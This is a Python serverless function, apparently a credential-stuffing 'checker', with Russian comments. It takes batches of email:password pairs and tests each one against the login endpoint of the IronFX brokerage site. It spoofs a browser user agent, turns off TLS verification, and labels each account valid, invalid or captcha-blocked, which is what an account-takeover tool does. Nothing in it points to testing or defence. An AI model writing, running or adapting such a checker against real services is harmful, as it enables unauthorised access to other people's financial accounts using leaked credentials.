"""
Проверка пар email:пароль на сайте IronFX (ironfx.com)
"""
import json
import requests


def handler(event: dict, context) -> dict:
    cors = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
    }

    if event.get('httpMethod') == 'OPTIONS':
        return {'statusCode': 200, 'headers': cors, 'body': ''}

    try:
        raw_body = event.get('body') or '{}'
        if isinstance(raw_body, str):
            body = json.loads(raw_body)
        else:
            body = raw_body
        credentials = body.get('credentials', [])

        if not credentials:
            return {
                'statusCode': 400,
                'headers': cors,
                'body': json.dumps({'error': 'Список credentials пустой'}),
            }

        results = []

        for item in credentials:
            login = item.get('email', '')
            password = item.get('password', '')

            if not login or not password:
                results.append({
                    'email': login,
                    'password': password,
                    'status': 'error',
                    'message': 'Пустой email или пароль',
                })
                continue

            result = check_account(login, password)
            results.append(result)

        return {
            'statusCode': 200,
            'headers': cors,
            'body': json.dumps({'results': results}),
        }

    except Exception as e:
        return {
            'statusCode': 500,
            'headers': cors,
            'body': json.dumps({'error': str(e)}),
        }


def check_account(login: str, password: str) -> dict:
    url = 'https://www.ironfx.com/json/login.json'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.ironfx.com',
        'Referer': 'https://www.ironfx.com/en/client-portal',
    }

    data = {
        'login': login,
        'password': password,
        'recapture_token': '',
    }

    try:
        session = requests.Session()

        # Сначала получаем куки с главной страницы
        session.get(
            'https://www.ironfx.com/en/client-portal',
            headers=headers,
            timeout=15,
            verify=False,
        )

        # Отправляем запрос авторизации
        response = session.post(
            url,
            data=data,
            headers=headers,
            timeout=15,
            verify=False,
            allow_redirects=True,
        )

        status_code = response.status_code
        resp_text = response.text.lower()

        # Анализируем ответ
        try:
            resp_json = response.json()
        except Exception:
            resp_json = {}

        # Определяем статус по ответу
        if status_code == 200:
            # Признаки успешного входа
            success_signals = [
                'success' in resp_json and resp_json.get('success') is True,
                'logged_in' in resp_json and resp_json.get('logged_in') is True,
                'token' in resp_json,
                'redirect' in resp_json,
                'dashboard' in resp_text,
                'welcome' in resp_text,
            ]
            # Признаки неверного пароля
            fail_signals = [
                'invalid' in resp_text,
                'incorrect' in resp_text,
                'wrong' in resp_text,
                'failed' in resp_text,
                'error' in resp_json,
                resp_json.get('success') is False,
                'captcha' in resp_text,
                'recaptcha' in resp_text,
            ]

            if any(success_signals):
                status = 'valid'
                message = 'Успешный вход'
            elif any(fail_signals):
                if 'captcha' in resp_text or 'recaptcha' in resp_text:
                    status = 'captcha'
                    message = 'Требуется капча'
                else:
                    status = 'invalid'
                    message = 'Неверный логин или пароль'
            else:
                status = 'unknown'
                message = f'Неизвестный ответ (HTTP {status_code})'
        elif status_code == 401 or status_code == 403:
            status = 'invalid'
            message = f'Отказано в доступе (HTTP {status_code})'
        elif status_code == 429:
            status = 'error'
            message = 'Слишком много запросов — лимит сайта'
        else:
            status = 'error'
            message = f'HTTP {status_code}'

        return {
            'email': login,
            'password': password,
            'status': status,
            'message': message,
            'http_code': status_code,
            'response_preview': response.text[:200] if response.text else '',
        }

    except requests.exceptions.Timeout:
        return {'email': login, 'password': password, 'status': 'error', 'message': 'Таймаут соединения'}
    except requests.exceptions.ConnectionError:
        return {'email': login, 'password': password, 'status': 'error', 'message': 'Ошибка соединения'}
    except Exception as e:
        return {'email': login, 'password': password, 'status': 'error', 'message': str(e)}